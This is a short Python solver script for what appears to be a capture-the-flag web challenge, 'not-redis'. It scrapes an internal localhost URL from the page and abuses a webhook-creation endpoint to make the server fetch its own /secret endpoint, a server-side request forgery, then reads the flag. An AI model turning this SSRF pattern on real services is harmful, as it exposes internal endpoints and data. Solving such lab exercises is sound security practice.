import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://not-redis.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def scrape_localhost_url(self):
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")

        return soup.find("input", value=True).get("value")

    def main(self):
        localhost_url = self.scrape_localhost_url()
        self.session.post(f"{BASE_URL}/create", data={"site": f"{localhost_url}/secret", "method": "POST"}) # /secret endpoint found in DOM of https://not-redis.quoccacorp.com

        response = self.session.get(f"{BASE_URL}/hook/5")
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()